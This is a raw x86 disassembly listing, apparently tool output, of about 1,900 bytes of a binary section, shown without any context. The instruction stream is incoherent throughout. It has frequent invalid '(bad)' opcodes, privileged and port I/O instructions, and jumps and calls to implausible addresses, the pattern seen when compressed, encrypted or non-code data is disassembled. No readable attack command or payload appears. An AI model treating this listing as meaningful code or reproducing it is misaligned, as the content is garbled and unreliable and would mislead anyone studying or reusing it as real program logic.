  41a2d4:	clc    
  41a2d5:	add    bl,BYTE PTR [edi+0x2711260d]
  41a2db:	cmp    cl,BYTE PTR ds:0x3186e2bb
  41a2e1:	pop    ds
  41a2e2:	test   BYTE PTR [ecx-0x1c],dl
  41a2e5:	or     dl,BYTE PTR [esp+ebx*4-0x15e8b253]
  41a2ec:	popa   
  41a2ed:	outs   dx,DWORD PTR ds:[esi]
  41a2ee:	cs mov ch,0x48
  41a2f1:	and    cl,ch
  41a2f3:	(bad)  
  41a2f4:	pop    ebp
  41a2f5:	mov    dh,0x48
  41a2f7:	and    eax,0xd198b03a
  41a2fc:	xchg   ecx,eax
  41a2fd:	in     al,dx
  41a2fe:	arpl   di,bx
  41a300:	jmp    0x41a35d
  41a302:	outs   dx,DWORD PTR ds:[esi]
  41a303:	out    dx,al
  41a304:	in     eax,dx
  41a305:	inc    edx
  41a306:	cmp    BYTE PTR [esp+ebx*4],dh
  41a309:	imul   edx,edi,0xffffffca
  41a30c:	int    0xb
  41a30e:	aam    0xa3
  41a310:	dec    esi
  41a311:	push   ebp
  41a312:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a313:	call   0x2754fc8d
  41a318:	int3   
  41a319:	mov    ecx,0x4ef9c75a
  41a31e:	jmp    esi
  41a320:	sub    al,0xd5
  41a322:	test   edi,0x3ffafe62
  41a328:	fstp   st(4)
  41a32a:	popf   
  41a32b:	shl    BYTE PTR [edx],0x4e
  41a32e:	and    esi,DWORD PTR [edx]
  41a330:	xchg   edx,eax
  41a331:	inc    eax
  41a332:	ins    DWORD PTR es:[edi],dx
  41a333:	mov    BYTE PTR [ebp-0x2c],bh
  41a336:	xchg   DWORD PTR ds:0x469936b6,esp
  41a33c:	ins    DWORD PTR es:[edi],dx
  41a33d:	cli    
  41a33e:	dec    esi
  41a33f:	jno    0x41a2c6
  41a341:	adc    eax,0x5d541ec8
  41a346:	sub    DWORD PTR [ebx+0x3a],0x0
  41a34a:	cs ss and eax,0xddbac0ec
  41a351:	jo     0x41a348
  41a353:	or     eax,0x21beda4a
  41a358:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a359:	dec    ecx
  41a35a:	mov    ds:0x983323b1,al
  41a35f:	sti    
  41a360:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a361:	cmp    BYTE PTR [edx-0x6884af25],bh
  41a367:	inc    edi
  41a368:	fnstenv [eax-0x66]
  41a36b:	imul   eax,DWORD PTR [ecx-0x15374392],0x78
  41a372:	fiadd  DWORD PTR [esi-0x72427a19]
  41a378:	fimul  WORD PTR [eax]
  41a37a:	pop    eax
  41a37b:	(bad)  
  41a37c:	jmp    0xa1f00a1e
  41a381:	fmulp  st(0),st
  41a383:	call   0xc417aad8
  41a388:	pop    ebp
  41a389:	mov    edi,?
  41a38b:	ss jl  0x41a3eb
  41a38e:	cdq    
  41a38f:	xchg   ebp,ebx
  41a391:	mov    ebp,0x2381016b
  41a396:	bound  ebp,QWORD PTR [edx]
  41a398:	or     eax,0xf4421f7a
  41a39d:	ja     0x41a406
  41a39f:	xchg   edx,eax
  41a3a0:	stc    
  41a3a1:	popf   
  41a3a2:	leave  
  41a3a3:	xchg   BYTE PTR [edx],ch
  41a3a5:	outs   dx,BYTE PTR ds:[esi]
  41a3a6:	xchg   edi,eax
  41a3a7:	pop    esp
  41a3a8:	loop   0x41a3ac
  41a3aa:	pop    esp
  41a3ab:	lahf   
  41a3ac:	pop    ebp
  41a3ad:	inc    DWORD PTR [ebx-0x71]
  41a3b0:	nop
  41a3b1:	sbb    BYTE PTR [edx-0x79],dh
  41a3b4:	and    eax,0xdd47c41c
  41a3b9:	mov    eax,0x84f233e8
  41a3be:	dec    esi
  41a3bf:	(bad)  
  41a3c0:	aam    0x40
  41a3c2:	lahf   
  41a3c3:	std    
  41a3c4:	fcmovnu st,st(4)
  41a3c6:	scas   al,BYTE PTR es:[edi]
  41a3c7:	dec    BYTE PTR [edi+0x2a]
  41a3ca:	cwde   
  41a3cb:	out    0x93,al
  41a3cd:	push   eax
  41a3ce:	adc    ah,bh
  41a3d0:	jo     0x41a3c0
  41a3d2:	mov    eax,0x4848a4ca
  41a3d7:	xchg   ebp,edi
  41a3d9:	iret   
  41a3da:	sete   BYTE PTR [ebp-0x48]
  41a3de:	cwde   
  41a3df:	mov    DWORD PTR [eax-0x6f7ee253],ecx
  41a3e5:	popa   
  41a3e6:	pop    es
  41a3e7:	lods   al,BYTE PTR ds:[esi]
  41a3e8:	adc    dh,BYTE PTR [ebx+0x6de40cae]
  41a3ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3ef:	xchg   BYTE PTR [edi],dh
  41a3f1:	(bad)  
  41a3f3:	xlat   BYTE PTR ds:[ebx]
  41a3f4:	fstp   QWORD PTR [eax+0x51bfde61]
  41a3fa:	pop    gs
  41a3fc:	xchg   BYTE PTR [edi-0x54],bh
  41a3ff:	mov    ds,WORD PTR [esi+0x21]
  41a402:	mov    gs,WORD PTR [edx-0x69a8624d]
  41a408:	sub    al,0xcf
  41a40a:	xchg   edi,eax
  41a40b:	jbe    0x41a477
  41a40d:	loopne 0x41a441
  41a40f:	jo     0x41a428
  41a411:	cmp    al,0xc2
  41a413:	mov    ecx,0x871946ed
  41a418:	and    edx,DWORD PTR [eax]
  41a41a:	mov    ah,0x5e
  41a41c:	fimul  WORD PTR [eax+edx*1]
  41a41f:	shl    BYTE PTR [esi+0x4],cl
  41a422:	or     esp,DWORD PTR ss:[ecx-0x831822d]
  41a429:	aaa    
  41a42a:	dec    ebx
  41a42b:	lods   eax,DWORD PTR ds:[esi]
  41a42c:	cs mov bh,0xaf
  41a42f:	xchg   bl,cl
  41a431:	mov    al,0x7f
  41a433:	jle    0x41a412
  41a435:	clc    
  41a436:	push   edi
  41a437:	clc    
  41a438:	jae    0x41a48a
  41a43a:	lea    edi,[edi]
  41a43c:	or     BYTE PTR [eax-0x10],al
  41a43f:	and    BYTE PTR [ebp+esi*8-0x54],ch
  41a443:	sub    eax,0x4ab36088
  41a448:	adc    al,0xbe
  41a44a:	pop    ss
  41a44b:	sub    DWORD PTR [ebx-0x33],0xffffff9f
  41a44f:	add    esp,DWORD PTR [edi+0x98b5940]
  41a455:	fstp   DWORD PTR [ecx+ebp*2]
  41a458:	test   eax,0x47d09e82
  41a45d:	ror    BYTE PTR [edi+ecx*1+0x4d],cl
  41a461:	mov    WORD PTR [edi+0x68228db7],gs
  41a467:	and    esp,ebp
  41a469:	test   al,0xaa
  41a46b:	xchg   dh,dl
  41a46d:	retf   0x5616
  41a470:	push   ebp
  41a471:	adc    DWORD PTR [edi+0x1d641f23],0xe979d42d
  41a47b:	mov    ah,0xbf
  41a47d:	popa   
  41a47e:	retf   
  41a47f:	xchg   ch,dh
  41a481:	ret    0x3c9a
  41a484:	sbb    edi,eax
  41a486:	test   DWORD PTR [esi+0x34],ecx
  41a489:	les    ebx,FWORD PTR [eax]
  41a48b:	pop    es
  41a48c:	lock jp 0x41a481
  41a48f:	lods   eax,DWORD PTR ds:[esi]
  41a490:	dec    esp
  41a491:	push   esi
  41a492:	ret    
  41a493:	js     0x41a455
  41a495:	cld    
  41a496:	loop   0x41a4b2
  41a498:	les    esi,FWORD PTR [eax+0x469875f]
  41a49e:	lods   eax,DWORD PTR ds:[esi]
  41a49f:	inc    ebp
  41a4a0:	push   esi
  41a4a1:	loope  0x41a4cc
  41a4a3:	xchg   eax,ebx
  41a4a5:	(bad)  
  41a4a6:	(bad)  
  41a4a7:	out    dx,eax
  41a4a8:	fld    QWORD PTR [ecx-0x7a]
  41a4ab:	mov    dh,0xaa
  41a4ad:	inc    ecx
  41a4ae:	scas   al,BYTE PTR es:[edi]
  41a4af:	jnp    0x41a49f
  41a4b1:	dec    edx
  41a4b2:	mov    eax,0x176ab80e
  41a4b7:	shl    bh,0x4f
  41a4ba:	adc    edx,DWORD PTR [ecx+0x63ac09dd]
  41a4c0:	jmp    0x4649:0x3b3a8087
  41a4c7:	push   cs
  41a4c8:	fcmovne st,st(1)
  41a4ca:	pop    ss
  41a4cb:	gs sbb eax,0xfce03830
  41a4d1:	sar    BYTE PTR [ebx-0x125de2b2],0x6c
  41a4d8:	hlt    
  41a4d9:	nop
  41a4da:	imul   edx,DWORD PTR [edx-0x11],0xffffffd7
  41a4de:	adc    eax,DWORD PTR [edi+0x8e28e3]
  41a4e4:	fld    QWORD PTR [ebp+ebp*2+0x78]
  41a4e8:	xchg   DWORD PTR [eax],esp
  41a4ea:	repz in eax,dx
  41a4ec:	mov    dh,0x40
  41a4ee:	les    ebp,FWORD PTR [esi+0x1d]
  41a4f1:	cdq    
  41a4f2:	aas    
  41a4f3:	xchg   edi,eax
  41a4f4:	test   eax,0x9af297f1
  41a4f9:	sub    esp,DWORD PTR [eax+0x4a327001]
  41a4ff:	inc    esi
  41a500:	jae    0x41a572
  41a502:	rol    BYTE PTR [esi+0x25b12da4],0xdd
  41a509:	mov    bl,0x7e
  41a50b:	push   ds
  41a50c:	rcl    BYTE PTR [esi+0x42dbba67],1
  41a512:	arpl   WORD PTR [edi],sp
  41a514:	cwde   
  41a515:	or     al,bl
  41a517:	popa   
  41a518:	cmp    eax,0xe0c0a8d9
  41a51d:	sbb    BYTE PTR [ebp+0x5bffb03e],dh
  41a523:	xor    al,0x0
  41a525:	and    DWORD PTR [edi-0x307bf9ca],eax
  41a52b:	push   esi
  41a52c:	xchg   ecx,eax
  41a52d:	xor    eax,0x3efe965a
  41a532:	xlat   BYTE PTR ds:[ebx]
  41a533:	push   ss
  41a534:	sub    BYTE PTR [eax],ah
  41a536:	push   edi
  41a537:	adc    DWORD PTR [edi],0x7681b06b
  41a53d:	shr    DWORD PTR [esi+eax*4+0x18fef1e3],0x7c
  41a545:	call   0x9839:0x126d86e1
  41a54c:	(bad)  [edx-0x6f]
  41a54f:	add    ecx,DWORD PTR [esi-0x7cb2de6d]
  41a555:	mov    ch,0xc
  41a557:	sbb    DWORD PTR [edx-0x25],esp
  41a55a:	dec    edi
  41a55b:	daa    
  41a55c:	retf   
  41a55d:	jmp    0x46122c80
  41a562:	pop    edi
  41a563:	pop    ds
  41a564:	fstp   st(0)
  41a566:	mov    eax,0x92e00540
  41a56b:	xchg   ecx,eax
  41a56c:	bound  ebx,QWORD PTR [edx+eax*2-0x3d]
  41a570:	fwait
  41a571:	add    BYTE PTR [edx+0x6d],dh
  41a574:	or     BYTE PTR [ecx+0x68],bh
  41a577:	dec    esi
  41a578:	(bad)  [eax-0x4e880e63]
  41a57e:	adc    eax,0x3740944c
  41a583:	ja     0x41a5e5
  41a585:	aad    0xc6
  41a587:	jge    0x41a5f3
  41a589:	call   0xb3d6:0x8dfcdda2
  41a590:	jns    0x41a565
  41a592:	sub    eax,0xcc29b88a
  41a597:	push   ds
  41a598:	int    0x40
  41a59a:	push   ds
  41a59b:	(bad)  
  41a59c:	in     eax,dx
  41a59d:	push   edi
  41a59e:	xchg   BYTE PTR [edx-0x4c683fd0],bh
  41a5a4:	cs dec esi
  41a5a6:	lea    esi,[ebp+0x32]
  41a5a9:	data16 xor dh,bh
  41a5ac:	shr    BYTE PTR ds:0xa6ef8759,1
  41a5b2:	cli    
  41a5b3:	mov    ebx,0xbf9ae75a
  41a5b8:	(bad)  
  41a5b9:	retf   
  41a5ba:	repnz xor DWORD PTR [eax],eax
  41a5bd:	and    cl,al
  41a5bf:	adc    eax,0x3dff41b2
  41a5c4:	mov    ch,0x53
  41a5c6:	xchg   ebp,eax
  41a5c7:	daa    
  41a5c8:	push   ss
  41a5c9:	and    BYTE PTR [ebx-0x7e],0xf6
  41a5cd:	mov    eax,0xc5447b97
  41a5d2:	mov    cl,0xfc
  41a5d4:	in     eax,dx
  41a5d5:	add    BYTE PTR [edi],0xf1
  41a5d8:	mov    bh,0x10
  41a5da:	int3   
  41a5db:	xchg   BYTE PTR ds:0xe42c0682,dh
  41a5e1:	ret    
  41a5e2:	or     esp,edx
  41a5e4:	imul   edx,DWORD PTR [esi],0xffffff88
  41a5e7:	call   0x53f6216f
  41a5ec:	jg     0x41a61a
  41a5ee:	mov    esp,0xc1f5e886
  41a5f3:	jo     0x41a5d3
  41a5f5:	push   esi
  41a5f6:	es sbb al,0x6b
  41a5f9:	xor    edx,DWORD PTR ds:0x92bccd23
  41a5ff:	cmp    DWORD PTR [ebx-0x5378fa8f],edi
  41a605:	xor    al,0xc7
  41a607:	push   ds
  41a608:	fimul  WORD PTR [ebx+0x7d]
  41a60b:	sub    cl,BYTE PTR [ebp+eax*8+0x6e]
  41a60f:	pop    ebx
  41a610:	or     eax,0x40ede672
  41a615:	stos   BYTE PTR es:[edi],al
  41a616:	push   ss
  41a617:	xchg   DWORD PTR [esi],esi
  41a619:	jbe    0x41a643
  41a61b:	mov    edx,0x199c4adf
  41a620:	gs clc 
  41a622:	hlt    
  41a623:	fst    DWORD PTR [edi]
  41a625:	xor    bl,dl
  41a627:	leave  
  41a628:	popa   
  41a629:	inc    eax
  41a62a:	scas   al,BYTE PTR es:[edi]
  41a62b:	jb     0x41a699
  41a62d:	pop    edx
  41a62e:	add    dl,BYTE PTR [edi+0x31]
  41a631:	repnz adc al,0xc1
  41a634:	fnstsw WORD PTR [ecx+0x1f8a4f3d]
  41a63a:	stos   DWORD PTR es:[edi],eax
  41a63b:	pop    edi
  41a63c:	mov    ebp,0xe5355d40
  41a641:	xor    BYTE PTR [esi-0x6e696452],ah
  41a647:	mov    eax,0xbe71d4dd
  41a64c:	inc    esp
  41a64d:	push   ss
  41a64e:	les    eax,FWORD PTR [ecx]
  41a650:	sbb    al,0x40
  41a652:	test   al,0x31
  41a654:	pop    ebp
  41a655:	shl    BYTE PTR [esi],1
  41a657:	sub    al,0x1d
  41a659:	imul   esp,DWORD PTR [esi-0x5034d8c],0xffffff93
  41a660:	cmp    eax,ebx
  41a662:	xchg   edi,eax
  41a663:	int    0x4d
  41a665:	test   al,0x59
  41a667:	(bad)  
  41a668:	sbb    dl,ch
  41a66a:	fiadd  DWORD PTR [esi+0x232b543e]
  41a670:	ficom  WORD PTR [ebp+ebp*4-0x2f]
  41a674:	(bad)  
  41a675:	add    eax,0x36a53256
  41a67a:	sbb    bh,dl
  41a67c:	idiv   ebx
  41a67e:	mov    bh,0x86
  41a680:	adc    bx,cx
  41a683:	mov    ah,0x15
  41a685:	sub    DWORD PTR [edx-0x2802db53],0xffffffa3
  41a68c:	outs   dx,DWORD PTR ds:[esi]
  41a68d:	xor    DWORD PTR [edi-0x6a],esi
  41a690:	scas   al,BYTE PTR es:[edi]
  41a691:	inc    eax
  41a692:	pop    edx
  41a693:	arpl   WORD PTR [ebx+0x3d],dx
  41a696:	aaa    
  41a697:	push   eax
  41a698:	mov    ds:0xa460974b,eax
  41a69d:	mov    ebx,eax
  41a69f:	nop
  41a6a0:	lods   al,BYTE PTR ds:[esi]
  41a6a1:	adc    ah,bl
  41a6a3:	adc    edx,DWORD PTR [esp+eax*1-0x2a]
  41a6a7:	xchg   bl,bl
  41a6a9:	pop    ds
  41a6aa:	daa    
  41a6ab:	pop    ecx
  41a6ac:	icebp  
  41a6ad:	clc    
  41a6ae:	inc    ecx
  41a6af:	sub    al,0xc7
  41a6b1:	mov    ebp,0x1c459497
  41a6b6:	shl    DWORD PTR [eax+edx*2],1
  41a6b9:	mov    cl,0x4e
  41a6bb:	hlt    
  41a6bc:	sub    bl,BYTE PTR [ecx+ecx*4+0x1faf7c8a]
  41a6c3:	(bad)  
  41a6c4:	fdivr  st(1),st
  41a6c6:	jnp    0x41a672
  41a6c8:	fstp   QWORD PTR [esi-0x71]
  41a6cb:	sbb    ebp,DWORD PTR [esi+ecx*1]
  41a6ce:	jmp    0x41a698
  41a6d0:	xchg   ecx,eax
  41a6d1:	inc    eax
  41a6d2:	inc    eax
  41a6d3:	sahf   
  41a6d4:	dec    esi
  41a6d5:	mov    dl,dl
  41a6d7:	mov    dh,0xe6
  41a6d9:	dec    esp
  41a6da:	xchg   ebx,eax
  41a6db:	popf   
  41a6dc:	mov    DWORD PTR [ebx-0x69],0x53adace9
  41a6e3:	add    dl,ah
  41a6e5:	into   
  41a6e6:	xor    dh,BYTE PTR [edx+0x79]
  41a6e9:	mov    DWORD PTR [ebx-0x386fe67a],esp
  41a6ef:	or     al,0xdd
  41a6f1:	inc    ebx
  41a6f2:	jp     0x41a73b
  41a6f4:	out    dx,eax
  41a6f5:	add    eax,0x40a83821
  41a6fa:	ins    DWORD PTR es:[edi],dx
  41a6fb:	rcl    BYTE PTR [edi+0xbe63108],0x15
  41a702:	cwde   
  41a703:	xor    DWORD PTR [esi+ebp*8+0x74a90689],edi
  41a70a:	add    DWORD PTR ds:0x8788505d,ebx
  41a710:	(bad)  
  41a712:	push   cs
  41a713:	adc    al,0xdd
  41a715:	or     dl,ah
  41a717:	out    dx,eax
  41a718:	push   edi
  41a719:	loop   0x41a73a
  41a71b:	push   ds
  41a71c:	dec    edx
  41a71d:	ss pop esi
  41a71f:	xchg   ecx,eax
  41a720:	push   ds
  41a721:	inc    eax
  41a722:	js     0x41a720
  41a724:	adc    DWORD PTR [eax+edx*8+0x5],0x4d
  41a729:	(bad)  
  41a72a:	mov    dh,0xc5
  41a72c:	jge    0x41a6f7
  41a72e:	xlat   BYTE PTR ds:[ebx]
  41a72f:	dec    esi
  41a730:	leave  
  41a731:	loop   0x41a77e
  41a733:	ins    BYTE PTR es:[edi],dx
  41a734:	add    DWORD PTR [ecx+0x47],0xe82b721e
  41a73b:	xor    ah,BYTE PTR [eax-0x22e8ccf4]
  41a741:	sbb    ch,BYTE PTR [esp+ebx*2]
  41a744:	call   0x47c4864a
  41a749:	inc    eax
  41a74a:	or     al,0x7b
  41a74c:	xchg   BYTE PTR [ecx+0x51],bh
  41a74f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a750:	jmp    0x42743ee1
  41a755:	xlat   BYTE PTR ds:[ebx]
  41a756:	cdq    
  41a757:	xchg   edi,eax
  41a758:	repnz cmc 
  41a75a:	cmp    DWORD PTR [ecx-0x75],0xa18759cf
  41a761:	adc    eax,ebp
  41a763:	(bad)  
  41a764:	fisub  WORD PTR [eax+0x7f]
  41a767:	pushw  es
  41a769:	shl    dl,0xfc
  41a76c:	mov    eax,ds:0x14b2a0db
  41a771:	iret   
  41a772:	push   ebx
  41a773:	xchg   esi,eax
  41a774:	jle    0x41a74f
  41a776:	push   ebp
  41a777:	xchg   ecx,eax
  41a778:	mov    eax,0xdf89af3c
  41a77d:	retf   0x3de9
  41a780:	loope  0x41a7bb
  41a782:	adc    BYTE PTR [ecx+0x67883b1e],dh
  41a788:	jmp    0x41a7ec
  41a78a:	pop    ebx
  41a78b:	xchg   ebp,eax
  41a78c:	mov    ebp,0xa42aa2b5
  41a791:	mov    ds:0x515b6297,eax
  41a796:	xchg   esp,eax
  41a797:	pushf  
  41a798:	imul   esi,ebx,0x11
  41a79b:	out    dx,eax
  41a79c:	pop    ecx
  41a79d:	add    bl,cl
  41a79f:	xchg   al,bl
  41a7a1:	pop    ebx
  41a7a2:	leave  
  41a7a3:	add    ebx,ebp
  41a7a5:	xor    ch,bl
  41a7a7:	cs loop 0x41a818
  41a7aa:	or     bl,BYTE PTR [edi]
  41a7ac:	push   ecx
  41a7ad:	inc    edi
  41a7ae:	sub    esp,ebx
  41a7b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a7b1:	mov    ds:0x4212527d,eax
  41a7b6:	jnp    0x41a76f
  41a7b8:	rcr    DWORD PTR [ebx-0x1d77a660],cl
  41a7be:	pop    esi
  41a7bf:	ins    BYTE PTR es:[edi],dx
  41a7c0:	clc    
  41a7c1:	ds in  eax,dx
  41a7c3:	xchg   BYTE PTR [ebp+0x26c10844],al
  41a7c9:	or     DWORD PTR [ebx+0x7f],0xffffffcd
  41a7cd:	into   
  41a7ce:	push   ss
  41a7cf:	pop    es
  41a7d0:	frstor [esi-0x2]
  41a7d3:	pop    edx
  41a7d4:	push   ebx
  41a7d5:	(bad)  
  41a7d6:	mov    dh,0x66
  41a7d8:	lahf   
  41a7d9:	inc    eax
  41a7da:	xor    BYTE PTR [ebx-0x16],ch
  41a7dd:	push   0x7a
  41a7df:	mov    esp,0x56a5bce1
  41a7e4:	mov    ah,0xee
  41a7e6:	std    
  41a7e7:	mov    eax,ds:0x478f7129
  41a7ec:	in     eax,0x4d
  41a7ee:	out    dx,eax
  41a7ef:	retf   0xac1e
  41a7f2:	aaa    
  41a7f3:	(bad)  [eax-0x19]
  41a7f6:	loopne 0x41a81b
  41a7f8:	cli    
  41a7f9:	lock inc edx
  41a7fb:	repnz fisttp QWORD PTR [eax-0x26]
  41a7ff:	sar    esi,0xb0
  41a802:	das    
  41a803:	jecxz  0x41a859
  41a805:	xor    DWORD PTR [edi-0x35fd427a],esi
  41a80b:	pop    ecx
  41a80c:	fst    QWORD PTR ds:0x3b6f35ee
  41a812:	(bad)  
  41a813:	sub    BYTE PTR [eax],dl
  41a815:	inc    eax
  41a816:	mov    esp,ds
  41a818:	repnz into 
  41a81a:	xor    al,0xfb
  41a81c:	rcr    DWORD PTR [ecx],0xb6
  41a81f:	xlat   BYTE PTR ds:[ebx]
  41a820:	cmp    ch,ch
  41a822:	pop    ss
  41a823:	xchg   BYTE PTR [eax-0x71e193b2],dh
  41a829:	inc    eax
  41a82a:	mov    al,0xc1
  41a82c:	xchg   ebx,eax
  41a82d:	xchg   ebx,eax
  41a82e:	iret   
  41a82f:	rcr    DWORD PTR [esi],cl
  41a831:	repz mov ds:0x239ba72,al
  41a837:	push   edi
  41a838:	popf   
  41a839:	sar    DWORD PTR [esi+0x7552d706],cl
  41a83f:	push   ebx
  41a840:	add    DWORD PTR [eax+0x28],0x61
  41a844:	in     eax,dx
  41a845:	adc    cl,bl
  41a847:	int    0xdd
  41a849:	add    ah,BYTE PTR [edi-0x3c]
  41a84c:	jp     0x41a7d0
  41a84e:	xchg   ecx,eax
  41a84f:	(bad)  
  41a850:	loopne 0x41a891
  41a852:	cmp    ch,BYTE PTR [esi+eax*8-0x50]
  41a856:	cmc    
  41a857:	mov    eax,ds:0xe19f0803
  41a85c:	jns    0x41a893
  41a85e:	aam    0x19
  41a860:	pop    ebp
  41a861:	dec    ecx
  41a862:	jl     0x41a81f
  41a864:	idiv   BYTE PTR [edi]
  41a866:	test   al,0x2f
  41a868:	push   0x912ce399
  41a86d:	lahf   
  41a86e:	xchg   DWORD PTR [ebx-0x23],edx
  41a871:	push   ebx
  41a872:	aaa    
  41a873:	iret   
  41a874:	loop   0x41a81d
  41a876:	les    esp,FWORD PTR ss:[ecx]
  41a879:	inc    eax
  41a87a:	xor    al,0x74
  41a87c:	mov    dh,0x8b
  41a87e:	sahf   
  41a87f:	and    BYTE PTR [eax+edi*1],ah
  41a882:	shl    BYTE PTR [ebx-0x51233fe1],cl
  41a888:	data16 jae 0x41a8f1
  41a88b:	dec    ebx
  41a88c:	fild   WORD PTR [eax-0x47]
  41a88f:	imul   BYTE PTR ds:0xe34215ce
  41a895:	xor    al,0x54
  41a897:	adc    DWORD PTR [ebp-0x179e42bf],eax
  41a89d:	lods   al,BYTE PTR ds:[esi]
  41a89e:	stos   DWORD PTR es:[edi],eax
  41a89f:	fldcw  WORD PTR [edi+0x40]
  41a8a2:	add    ch,ch
  41a8a4:	das    
  41a8a5:	jae    0x41a876
  41a8a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a8a8:	sbb    edx,DWORD PTR [esi+0x17]
  41a8ab:	xchg   DWORD PTR [edi+edi*1+0x34],esi
  41a8af:	popa   
  41a8b0:	loopne 0x41a8c1
  41a8b2:	pop    es
  41a8b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8b4:	ffreep st(7)
  41a8b6:	sub    DWORD PTR ds:0x4df6e60d,esp
  41a8bc:	rcl    BYTE PTR [edi+0x14],0xc6
  41a8c0:	mov    ah,0x40
  41a8c2:	call   ebx
  41a8c4:	jle    0x41a908
  41a8c6:	mov    esi,0x2bc9de5e
  41a8cb:	push   0xe2e71f53
  41a8d0:	std    
  41a8d1:	mov    ebx,0xb9e4de8f
  41a8d6:	ja     0x4600cf50
  41a8dc:	out    0xf3,al
  41a8de:	xor    DWORD PTR [ecx-0x2ed5bf34],edx
  41a8e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8e5:	sahf   
  41a8e6:	xchg   esp,eax
  41a8e7:	icebp  
  41a8e8:	inc    ecx
  41a8e9:	lods   al,BYTE PTR ds:[esi]
  41a8ea:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41a8ec:	sbb    DWORD PTR [ebx+0x5b91c733],ecx
  41a8f2:	sahf   
  41a8f3:	mov    bl,0x14
  41a8f5:	and    edi,DWORD PTR [edx]
  41a8f7:	xlat   BYTE PTR ds:[ebx]
  41a8f8:	mov    ebp,0x25c6ba58
  41a8fd:	inc    eax
  41a8fe:	cdq    
  41a8ff:	xor    edi,0x6c
  41a902:	and    al,0x68
  41a904:	add    al,0x81
  41a906:	xchg   edi,eax
  41a907:	fwait
  41a908:	out    0xa7,al
  41a90a:	rcr    ecx,cl
  41a90c:	dec    ebx
  41a90d:	pop    esp
  41a90e:	je     0x41a91e
  41a910:	push   edi
  41a911:	in     al,dx
  41a912:	fwait
  41a913:	xchg   BYTE PTR [edx+ebp*4+0x38dd9748],al
  41a91a:	or     DWORD PTR [edx],0xffffffcc
  41a91d:	fistp  WORD PTR [ebx]
  41a91f:	fist   WORD PTR [ebx+0x5911e340]
  41a925:	mov    edi,0xc27b65ec
  41a92a:	cdq    
  41a92b:	fxch   st(5)
  41a92d:	lahf   
  41a92e:	arpl   WORD PTR [esi+0x1],bp
  41a931:	and    BYTE PTR [ebx+edi*2+0x65],dl
  41a935:	inc    eax
  41a936:	and    esp,DWORD PTR [edx+0x7f796718]
  41a93c:	mov    dl,0xec
  41a93e:	xchg   edi,eax
  41a93f:	push   ebp
  41a940:	dec    ebx
  41a941:	je     0x41a978
  41a943:	fwait
  41a944:	sub    al,0x3c
  41a946:	es dec esi
  41a948:	pop    esi
  41a949:	push   esi
  41a94a:	pop    esp
  41a94b:	xchg   DWORD PTR [edi+0x26],edx
  41a94e:	sbb    eax,0x97abd712
  41a953:	clc    
  41a954:	add    esp,eax
  41a956:	jmp    0x41a937
  41a958:	(bad)  
  41a959:	jmp    0x7c9e:0x40b5f845
  41a960:	push   cs
  41a961:	add    eax,0x2dc9fa8f
  41a966:	cwde   
  41a967:	std    
  41a968:	xchg   esi,eax
  41a969:	pop    esp
  41a96a:	aas    
  41a96b:	out    dx,al
  41a96c:	test   eax,0x249b5afc
  41a971:	mov    eax,0x7a0cf965
  41a976:	outs   dx,DWORD PTR ds:[esi]
  41a977:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a978:	outs   dx,BYTE PTR ds:[esi]
  41a979:	and    eax,0x558386e7
  41a97e:	xchg   edi,eax
  41a97f:	aam    0xa4
  41a981:	xchg   edi,eax
  41a982:	adc    DWORD PTR [edx+0x153a2739],esi
  41a988:	je     0x41a94c
  41a98a:	xchg   edi,eax
  41a98b:	les    edx,FWORD PTR [edi-0x53e7708e]
  41a991:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a992:	jnp    0x41a9e6
  41a994:	ficom  WORD PTR [eax]
  41a996:	xchg   esp,eax
  41a997:	mov    ebp,0xdeccffec
  41a99c:	std    
  41a99d:	pop    esi
  41a99e:	addr16 or bl,ah
  41a9a1:	inc    edx
  41a9a2:	cmp    eax,0xf3cc9f87
  41a9a7:	pop    ecx
  41a9a8:	xlat   BYTE PTR ds:[ebx]
  41a9a9:	pop    edx
  41a9aa:	xchg   edi,eax
  41a9ab:	(bad)  
  41a9ac:	fwait
  41a9ad:	sbb    bh,BYTE PTR [edx+0x5a8dd953]
  41a9b3:	xchg   ebp,eax
  41a9b4:	pusha  
  41a9b5:	loopne 0x41a9c7
  41a9b7:	xchg   DWORD PTR [edx-0x1f26ccbc],ebx
  41a9bd:	mov    bl,0xc4
  41a9bf:	dec    edi
  41a9c0:	cdq    
  41a9c1:	pop    ss
  41a9c2:	jb     0x41aa0a
  41a9c4:	lock fwait
  41a9c6:	dec    esi
  41a9c7:	pop    es
  41a9c8:	sar    DWORD PTR [edx+edx*4],1
  41a9cb:	xchg   ebp,eax
  41a9cc:	cmp    eax,0xcdf0d016
  41a9d1:	jmp    0x87fc06d
  41a9d6:	cmp    dl,BYTE PTR [edi+ebx*8-0x81a0567]
  41a9dd:	mov    DWORD PTR [esi-0x72],eax
  41a9e0:	jne    0x41a992
  41a9e2:	(bad)  
  41a9e4:	or     ebp,DWORD PTR [ebp-0x66]
  41a9e7:	xchg   eax,edx
  41a9e9:	dec    esi
  41a9ea:	mov    ebx,0x4e30837b
  41a9ef:	xchg   ebx,eax
  41a9f0:	mov    bh,0x47
  41a9f2:	lahf   
  41a9f3:	iret   
  41a9f4:	mov    al,BYTE PTR [edi]
  41a9f6:	push   esp
  41a9f7:	aad    0xd6
  41a9f9:	and    bl,bh
  41a9fb:	push   es
  41a9fc:	(bad)  [ecx+esi*8-0x4b]
  41aa00:	add    DWORD PTR [esi],ecx
  41aa02:	jb     0x41a9f4
  41aa04:	mov    WORD PTR [eax+0x57],es
  41aa07:	mov    ah,dl
  41aa09:	xchg   esp,eax
  41aa0a:	sbb    al,0x9c
  41aa0c:	pop    ecx
  41aa0d:	sub    BYTE PTR [esi-0x5ef11296],ah
  41aa13:	and    eax,0xc748446d
  41aa18:	fnstenv [edx]
  41aa1a:	or     BYTE PTR [ebx-0x69f91fac],dh
  41aa20:	cmp    eax,0x60c0132e
